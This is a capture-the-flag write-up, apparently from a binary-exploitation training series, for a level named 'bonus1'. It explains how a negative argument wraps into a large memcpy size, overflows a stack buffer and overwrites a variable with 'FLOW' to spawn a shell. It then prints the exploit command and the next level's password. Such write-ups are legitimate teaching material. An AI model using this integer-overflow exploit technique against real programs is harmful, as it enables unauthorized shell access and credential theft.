```C
int32_t main(int32_t argc, char** argv, char** envp)
{
    int32_t number = atoi(argv[1]);
    
    if (number > 9)
        return 1;
    
    void dest;
    memcpy(&dest, argv[2], (size_t)(number * 4));  
    
    if (number == 0x574f4c46)
        execl("/bin/sh", "sh", 0);
    
    return 0;
}

```

- We want to pass throug the first condition. We can put a number smaller than 9. Even if this number will determine how much bytes will be copied into dest by memcpy, we can put a negative number since it's third parameter takes a size_t, it will implicitly be casted.
- A good number to take would be -2147483637 because: (size_t)(-2147483637 * 4) = 44.
- Number is 40 bytes from number so we can copy 40 bytes, then overwrite number with 0x574f4c46 ("FLOW" in ascii)

```bash
payload = ./bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW

$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```